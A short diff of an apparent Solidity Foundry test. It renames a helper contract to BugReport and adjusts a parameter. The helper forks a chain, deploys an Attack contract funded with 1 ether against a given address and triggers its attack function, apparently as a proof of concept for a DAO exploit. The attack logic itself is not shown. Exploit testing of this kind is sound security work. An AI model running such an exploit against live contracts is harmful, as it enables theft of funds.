@@ -27,13 +27,13 @@ contract Attack {
     }
 }
 
-contract AttackHelper is Test {
+contract BugReport is Test {
     Attack public att;
 
-    function bug(uint256 forkId, address daoAddr) internal {
+    function bug(uint256 forkId, address addr) internal {
         vm.selectFork(forkId);
 
-        att = new Attack{ value: 1 ether }(daoAddr);
+        att = new Attack{ value: 1 ether }(addr);
         att.attack{ value: 1 ether }();
     }
 }
